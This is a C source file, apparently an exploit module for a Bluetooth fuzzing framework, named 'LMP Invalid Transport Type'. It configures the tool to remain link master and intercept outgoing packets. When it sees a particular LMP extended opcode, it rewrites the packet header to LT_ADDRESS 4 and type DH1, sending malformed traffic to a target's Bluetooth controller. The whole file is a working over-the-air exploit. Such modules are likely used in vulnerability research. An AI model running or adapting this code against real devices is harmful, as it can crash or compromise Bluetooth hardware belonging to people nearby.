#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters

// Vars

// Setup
static const char *module_name()
{
    return "LMP Invalid Transport Type";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 6000;
    config->bluetooth.disable_role_switch = true; // Ensure we are always the link master
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (IS_LMP_EXT_OPCODE(pkt_buf, 16))
    {
        // Data Element Size: uint32 (3)
        wd_log_y("Sending LT_ADDRESS=4, Type=0x04 (DH1)");
        pkt_buf[0] = (pkt_buf[0] & (~(0b111))) | 4;
        pkt_buf[0] = (pkt_buf[0] & (~(0b1111 << 3))) | (0x04 << 3);
        return 1;
    }
    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}